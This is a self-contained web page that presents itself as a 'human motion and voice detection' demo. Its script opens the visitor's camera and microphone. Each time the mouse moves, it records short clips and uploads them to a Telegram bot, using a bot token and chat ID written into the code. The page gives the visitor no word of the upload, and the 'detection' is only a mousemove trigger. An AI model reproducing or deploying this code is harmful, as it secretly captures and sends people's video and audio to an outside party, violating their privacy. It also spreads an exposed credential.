<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Human Motion & Voice Detection</title>
    <style>
        body { text-align: center; background-color: #222; color: white; }
        video { width: 100%; max-width: 500px; border: 5px solid red; }
    </style>
</head>
<body>
    <h1>Human Motion & Voice Detection</h1>
    <video id="video" autoplay></video>
    <script>
        const video = document.getElementById('video');
        const TELEGRAM_BOT_TOKEN = '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk';
        const CHAT_ID = '8101021767';
        let humanDetected = false;
        
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                video.srcObject = stream;
                startRecording(stream);
            })
            .catch(err => console.error("Error accessing camera/microphone:", err));

        function startRecording(stream) {
            let mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            
            mediaRecorder.ondataavailable = event => chunks.push(event.data);
            
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                sendVideo(blob);
                chunks = [];
            };
            
            setInterval(() => {
                if (!humanDetected) return;
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            }, 5000);
        }

        function detectHuman() {
            humanDetected = true;
            setTimeout(() => humanDetected = false, 10000); // Reset after 10s
        }
        
        function sendVideo(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', blob, 'motion_detected.webm');
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log("Video sent:", data))
            .catch(err => console.error("Error sending video:", err));
        }
        
        document.body.addEventListener('mousemove', detectHuman);
    </script>
</body>
</html>
